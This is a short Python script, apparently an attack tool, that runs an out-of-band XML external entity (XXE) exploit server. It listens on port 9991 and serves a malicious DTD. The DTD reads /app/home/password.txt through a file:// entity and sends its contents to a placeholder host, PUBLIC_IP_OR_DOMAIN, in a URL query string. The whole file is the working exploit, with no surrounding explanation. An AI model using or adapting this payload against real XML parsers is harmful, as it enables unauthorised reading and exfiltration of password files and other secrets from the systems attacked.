#!/usr/env/python
# coding: utf-8

from __future__ import print_function
import socket
import base64

PORT = 9991 # Port to listen

file = '''/app/home/password.txt'''

dtd = '''<!ENTITY % file SYSTEM "file://{}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://PUBLIC_IP_OR_DOMAIN/?x=%file;'>">
%eval;
%exfil;'''.format(file);

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',PORT))
s.listen(1)
conn,addr = s.accept()
print('->  HTTP-connection accepted')

data = conn.recv(1024)
conn.sendall('HTTP/1.1 200 OK\r\nUser-Agent: Mozilla\r\nContent-Type: application/json\r\nContent-length: {len}\r\n\r\n{dtd}'.format(len=len(dtd)+1, dtd=dtd))
print('->  DTD sent')
conn.close()
